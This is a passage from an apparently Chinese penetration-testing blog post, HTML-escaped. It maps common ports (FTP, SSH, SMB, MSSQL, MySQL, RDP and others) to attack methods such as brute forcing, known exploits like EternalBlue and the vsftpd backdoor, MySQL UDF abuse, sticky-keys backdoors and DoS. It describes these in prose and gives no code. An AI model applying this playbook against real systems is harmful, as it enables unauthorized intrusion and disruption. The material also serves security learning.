&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 注入 / 缓冲区溢出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;5632&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;pcanywhere 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;抓密码 / 代码执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;5900&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;vnc&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / 认证绕过&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;6379&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Redis 数据库&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;未授权访问 / 爆破&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;7001/7002&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;weblogic&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;java 反序列化 / 控制台弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;80/443&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;http/https&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;web 应用漏洞 / 心脏滴血&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;8069&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;zabbix 服务&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;远程命令执行 / 注入&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;8161&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;activemq&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;弱口令 / 写文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;8080/8089&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Jboss/Tomcat/Resin&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 / PUT 文件上传 / 反序列化&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;8083/8086&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;influxDB&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;9000&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;fastcgi&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;远程命令执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;9090&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Websphere 控制台&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;爆破 /java 反序列化 / 弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;9200/9300&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;elasticsearch&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;远程代码执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;11211&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;memcached&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;27017/27018&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;mongodb&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;未授权访问 / 爆破&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h5 id=&#34;21端口渗透剖析ftp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#21端口渗透剖析ftp&#34;&gt;#&lt;/a&gt;  &lt;code&gt;21端口渗透剖析&lt;/code&gt;  (FTP)&lt;/h5&gt;
&lt;p&gt;FTP 通常用作对远程服务器进行管理，典型应用就是对 web 系统进行管理。一旦 FTP 密码泄露就直接威胁 web 系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透 FTP 服务器的几种方法。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。``（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。（5）ftp远程代码溢出 （proftpd 1.3.3c） （https://blog.csdn.net/weixin_42214273/article/details/82892282）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（6）ftp跳转攻击&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;22端口渗透剖析ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#22端口渗透剖析ssh&#34;&gt;#&lt;/a&gt;  &lt;code&gt;22端口渗透剖析&lt;/code&gt;  (SSH)&lt;/h5&gt;
&lt;p&gt;SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）弱口令，可使用工具hydra，msf中的ssh爆破模块,也可以直接利用模块sshexec直接利用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）防火墙SSH后门。（https://www.secpulse.com/archives/69093.html）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）28退格 OpenSSL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）openssh 用户枚举 CVE-2018-15473。（https://www.anquanke.com/post/id/157607）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;23端口渗透剖析telnet&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23端口渗透剖析telnet&#34;&gt;#&lt;/a&gt;  &lt;code&gt;23端口渗透剖析&lt;/code&gt;  (TELNET)&lt;/h5&gt;
&lt;p&gt;telnet 是一种旧的远程管理方式，使用 telnet 工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;25465端口渗透剖析smtp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#25465端口渗透剖析smtp&#34;&gt;#&lt;/a&gt;  &lt;code&gt;25/465端口渗透剖析&lt;/code&gt;  (SMTP)&lt;/h5&gt;
&lt;p&gt;smtp：邮件协议，在 linux 中默认开启这个服务，可以向对方发送钓鱼邮件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;默认端口：25（smtp）、465（smtps）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（1）爆破：弱口令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）未授权访问&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;53端口渗透剖析dns&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#53端口渗透剖析dns&#34;&gt;#&lt;/a&gt;  &lt;code&gt;53端口渗透剖析&lt;/code&gt;  (DNS)&lt;/h5&gt;
&lt;p&gt;53 端口是 DNS 域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（https://www.seebug.org/vuldb/ssvid-96718）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https://baijiahao.baidu.com/s?id=1577362432987749706&amp;amp;wfr=spider&amp;amp;for=pc）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）DNS劫持 （https://blog.csdn.net/qq_32447301/article/details/77542474）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;80端口渗透剖析http&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#80端口渗透剖析http&#34;&gt;#&lt;/a&gt;  &lt;code&gt;80端口渗透剖析&lt;/code&gt;  (HTTP)&lt;/h5&gt;
&lt;p&gt;80 端口通常提供 web 服务。目前黑客对 80 端口的攻击典型是采用&lt;strong&gt; SQL 注入&lt;/strong&gt;的攻击方法，脚本渗透技术也是一项综合性极高的 web 渗透技术，同时脚本渗透技术对 80 端口也构成严重的威胁。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（8）CVE-2017-7269 IIS远程代码执行&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;139445端口渗透剖析smb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#139445端口渗透剖析smb&#34;&gt;#&lt;/a&gt;  &lt;code&gt;139/445端口渗透剖析&lt;/code&gt;  (SMB)&lt;/h5&gt;
&lt;p&gt;139 端口是为‘NetBIOS SessionService’提供的，主要用于提供 windows 文件和打印机共享以及 UNIX 中的 Samba 服务。445 端口也用于提供 windows 文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445 端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-17010永恒之蓝或psexec（https://blog.csdn.net/qq_41880069/article/details/82908131）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（https://blog.csdn.net/god_7z1/article/details/6773652）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（https://blog.warhut.cn/dmbj/145.html）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;1433端口渗透剖析sqlserver&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1433端口渗透剖析sqlserver&#34;&gt;#&lt;/a&gt;  &lt;code&gt;1433端口渗透剖析&lt;/code&gt;  (SQLServer)&lt;/h5&gt;
&lt;p&gt;1433 是 SQLServer 默认的端口，SQL Server 服务使用两个端口：tcp-1433、UDP-1434. 其中 1433 用于供 SQLServer 对外提供服务，1434 用于向请求者返回 SQLServer 使用了哪些 TCP/IP 端口。1433 端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于&lt;strong&gt;远程溢出漏洞&lt;/strong&gt;了，如由于 SQL 注射攻击的兴起，各类数据库时刻面临着安全威胁。利用 SQL 注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（https://blog.csdn.net/gxj022/article/details/4593015）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（https://blog.csdn.net/kali_linux/article/details/50499576） 可利用模块mssql&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）嗅探技术同样能嗅探到SQL Server的登录密码。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;1521端口渗透剖析oracle&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1521端口渗透剖析oracle&#34;&gt;#&lt;/a&gt;  &lt;code&gt;1521端口渗透剖析&lt;/code&gt;  (Oracle)&lt;/h5&gt;
&lt;p&gt;1521 是大型数据库 Oracle 的默认监听端口，平时大家接触的比较多的是 Access，MSSQL 以及 MYSQL 这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）在注入点直接创建java，执行系统命令(https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;2049端口渗透剖析nfs&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2049端口渗透剖析nfs&#34;&gt;#&lt;/a&gt;  &lt;code&gt;2049端口渗透剖析&lt;/code&gt;  (NFS)&lt;/h5&gt;
&lt;p&gt;NFS（Network File System）即网络文件系统，是 FreeBSD 支持的文件系统中的一种，它允许网络中的计算机之间通过 TCP/IP 网络共享资源。在 NFS 的应用中，本地 NFS 的客户端应用可以透明地读写位于远端 NFS 服务器上的文件，就像访问本地文件一样。如今 NFS 具备了防止被利用导出文件夹的功能，但遗留系统中的 NFS 服务配置不当，则仍可能遭到恶意攻击者的利用。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;未授权访问。（https://www.freebuf.com/articles/network/159468.html）      (https://www.hackliu.com/?p=426)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;3306端口渗透剖析mysql&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3306端口渗透剖析mysql&#34;&gt;#&lt;/a&gt;  &lt;code&gt;3306端口渗透剖析&lt;/code&gt;  (MYSQL)&lt;/h5&gt;
&lt;p&gt;3306 是 MYSQL 数据库默认的监听端口，通常部署在中型 web 系统中。在国内 LAMP 的配置是非常流行的，对于 php+mysql 构架的攻击也是属于比较热门的话题。mysql 数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于 3306 端口的渗透:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）弱口令：由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;3389端口渗透剖析rdp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3389端口渗透剖析rdp&#34;&gt;#&lt;/a&gt;  &lt;code&gt;3389端口渗透剖析&lt;/code&gt;  (RDP)&lt;/h5&gt;
&lt;p&gt;3389 是 windows 远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（3）Shift粘滞键后门：5次shift后门&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（5）爆破3389端口。这里还是推荐使用hydra爆破工具。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;（6）ms12_020死亡蓝屏攻击。（https://www.cnblogs.com/R-Hacker/p/9178066.html）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;4899端口渗透剖析radmini远控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4899端口渗透剖析radmini远控&#34;&gt;#&lt;/a&gt;  &lt;code&gt;4899端口渗透剖析&lt;/code&gt;  (radmini 远控)&lt;/h5&gt;
&lt;p&gt;4899 端口是&lt;strong&gt; remoteadministrator&lt;/strong&gt; 远程控制软件默认监听的端口，也就是平时常说的 radmini 影子。radmini 目前支持 TCP/IP 协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：&lt;/p&gt;
